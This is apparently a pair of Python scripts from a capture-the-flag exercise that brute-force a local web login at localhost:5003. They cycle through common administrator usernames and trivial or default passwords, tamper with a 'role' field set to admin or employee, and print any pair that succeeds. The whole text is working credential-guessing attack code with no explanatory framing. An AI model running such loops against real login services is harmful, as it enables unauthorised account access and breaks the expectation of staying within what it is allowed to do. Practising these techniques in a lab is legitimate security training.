import requests
# Try short, trivial passwords on likely usernames limited by filter
for user in ['admin','administrator','root','superuser','sqladmin']:
    for pwd in ['a','aa','aaa','aaaa','aaaaa','admin','root','test','pass','user','flag','ctf','abc','abcd','abcde','guest','default','1234','12345','123456','letmein','qwerty']:
        resp = requests.post('http://localhost:5003/login', data={'username':user,'password':pwd,'role':'admin'})
        if 'success' in resp.text and 'true' in resp.text:
            print(f'SUCCESS: {user}:{pwd} ->',resp.text)
        elif 'redirect' in resp.text and resp.json().get('redirect'):
            print(f'REDIRECT: {user}:{pwd} ->',resp.text)

import requests
# Try 'employee' role with simple/default credentials, in case access as employee is weak
for user in ['admin','administrator','employee','root']:
    for pwd in ['admin','password','1234','abcd','test','employee','user','qwerty','letmein','flag','ctf']:
        resp = requests.post('http://localhost:5003/login', data={'username':user,'password':pwd,'role':'employee'})
        if 'success' in resp.text and 'true' in resp.text:
            print(f'SUCCESS: {user}:{pwd} ->',resp.text)
        elif 'redirect' in resp.text and resp.json().get('redirect'):
            print(f'REDIRECT: {user}:{pwd} ->',resp.text)

